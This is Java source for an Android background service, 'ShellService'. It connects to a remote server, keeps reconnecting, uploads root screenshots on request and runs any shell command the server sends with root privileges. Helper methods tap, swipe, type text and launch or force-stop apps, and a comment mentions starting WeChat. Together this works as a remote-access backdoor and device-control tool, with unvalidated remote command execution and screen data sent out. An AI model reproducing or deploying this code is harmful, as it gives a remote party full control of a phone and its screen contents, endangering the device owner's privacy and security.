package com.remote;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;
import com.chat.ChatClient;

import java.io.File;

public class ShellService extends Service {

    public interface OnImageCall {
        public void onImage(byte[] bytes);
    }

    public static final String SCREENSHOT_DIR = "/sdcard/" ;
    public static final String SCREENSHOT_FILE_NAME = SCREENSHOT_DIR + "screenshot.png";

    private Handler mHandler;
    private boolean mRunningScreenShot = false;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mHandler = new Handler();

        startService();
        onSendHeartBeat();
        try2SendScreen(null);
    }

    private void startService(){

        ChatClient.get().run(new ChatClient.NetInterface() {

            @Override
            public void onError() {

                mHandler.postDelayed(new Runnable() {
                         @Override
                         public void run() {
                             startService();
                         }
                     },10000
                );
            }

            @Override
            public void onReceive(byte[] bytes) {
                System.out.println("say onRecevie: " + new String(bytes));
                switch (bytes[0]) {
                    case 1:{
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try2SendScreen(null);
                            }
                        },100);
                    }break;
                    case 2:{
                        byte[] data = new byte[bytes.length - 1];
                        System.arraycopy(bytes, 1, data, 0, bytes.length - 1);
                        try2Command(new String(data), new Runnable() {
                            @Override
                            public void run() {
                            mHandler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    try2SendScreen(new Runnable() {
                                        @Override
                                        public void run() {
                                            mHandler.postDelayed(new Runnable() {
                                                @Override
                                                public void run() {
                                                    try2SendScreen(null);
                                                }
                                            },2000);
                                        }
                                    });
                                }
                            },500);
                            }
                        });
                    }break;
                    case 3:
                        break;
                }
            }
        });
    }

    private void onSendHeartBeat(){

        mHandler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 if(ChatClient.get().isConnect()){
                     ChatClient.get().send(2,"hello ，it is me!".getBytes());
                     onSendHeartBeat();
                 }
                 else{
                     startService();
                 }
             }
         },10 * 1000
        );
    }

    private void try2SendScreen(final Runnable runnable){

        mHandler.post(new Runnable() {
            @Override
            public void run() {
            try2Screenshot(new OnImageCall() {
                @Override
                public void onImage(final byte[] bytes) {
                    mHandler.post(new Runnable() {
                        @Override
                        public void run() {
                            if(null != bytes && bytes.length > 0){
                                ChatClient.get().send(1, bytes);
                                System.out.println("say send bitmap: data ");
                            }
                            else{
                                System.out.println("say send bitmap: null ");
                            }
                            if(null != runnable){
                                mHandler.postDelayed(runnable, 200);
                            }
                        }
                    });
                }
            });
            }
        });
    }

    private void try2StopApp(final String packageName, final Runnable runnable) {

        mHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"try2StartApp  " + packageName,Toast.LENGTH_LONG).show();
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String command[] = new String[]{"sh",
                            "am  force-stop  "+ packageName};
                    Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                    Log.d("Achilles:", commandResult.errorMsg);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        mHandler.postDelayed(runnable, 10000);
    }

    //root下的截屏
    private void try2Screenshot(final OnImageCall call ) {

        new Thread(new Runnable() {
            @Override
            public void run() {

                File file = new File(SCREENSHOT_DIR);
                if (!file.exists()) {
                    file.mkdirs();
                }else{
                    file  = new File(SCREENSHOT_FILE_NAME);
                    if (file.exists()) {
                        file.delete();
                    }
                }

                String command[] = new String[]{"sh",
                        "/system/bin/screencap -p " + SCREENSHOT_FILE_NAME};
                Log.v("Achilles: >>> ","aa ");

                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                Utils.CommandResult commandResult = Utils.execCommand(command, true, false);
                Log.v("Achilles: >>> ","aa ccc");

                if(null != call){
                    call.onImage(Utils.execScreenshot(SCREENSHOT_FILE_NAME));
                }
            }
        }).start();
    }

    //
    private void try2Command(final String c,final Runnable runnable) {

        System.out.println("say try2Command: " + c);

        mHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"try2Command  "+ c,Toast.LENGTH_SHORT).show();
            }
        });

        //执行swipe命令
        new Thread(new Runnable() {
            @Override
            public void run() {
                String command[] = new String[]{"sh", c };
                Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                Log.d("Achilles:", commandResult.errorMsg);
            }
        }).start();

        if(null != runnable){
            mHandler.postDelayed(runnable, 200);
        }
    }

    //
    private void try2InputText(final String s,final Runnable runnable) {

        mHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"try2InputText  "+ s,Toast.LENGTH_SHORT).show();
            }
        });
        //执行swipe命令
        new Thread(new Runnable() {
            @Override
            public void run() {
                String command[] = new String[]{"sh",
                        "input text " + s};
                Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                Log.d("Achilles:", commandResult.errorMsg);
            }
        }).start();

        if(null != runnable){
            mHandler.postDelayed(runnable, 6000);
        }
    }

    //
    private void try2Wape(final int x,final int y,final int cx,final int cy,final int delay,final Runnable runnable) {

        //执行swipe命令
        new Thread(new Runnable() {
            @Override
            public void run() {
                String command[] = new String[]{"sh",
                        "input touchscreen swipe "+x+" " +y+ " " + cx + " "+ cy + " " + delay};
                Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                Log.d("Achilles:", commandResult.errorMsg);
            }
        }).start();

        if(null != runnable){
            mHandler.postDelayed(runnable, 6000);
        }
    }

    //
    private void try2Click(final int x,final int y,final Runnable runnable) {

        //执行swipe命令
        new Thread(new Runnable() {
            @Override
            public void run() {
                String command[] = new String[]{"sh",
                        "input tap " + (x + (int)(2 * Math.random())) +  " "+ (y + (int)(2 * Math.random())) };
                Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                Log.d("Achilles:", commandResult.errorMsg);
            }
        }).start();

        if(null != runnable){
            mHandler.postDelayed(runnable, 2000);
        }
    }


    //root下的启动微信
    private void try2StartApp(final String packageName, final Runnable runnable) {

        mHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"try2StartApp  " + packageName,Toast.LENGTH_LONG).show();
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String command[] = new String[]{"sh",
                            "monkey -p "+ packageName +" -c android.intent.category.LAUNCHER 1"};
                    Utils.CommandResult commandResult = Utils.execCommand(command, true, true);
                    Log.d("Achilles:", commandResult.errorMsg);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

        if(null != runnable){
            mHandler.postDelayed(runnable, 6000);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}

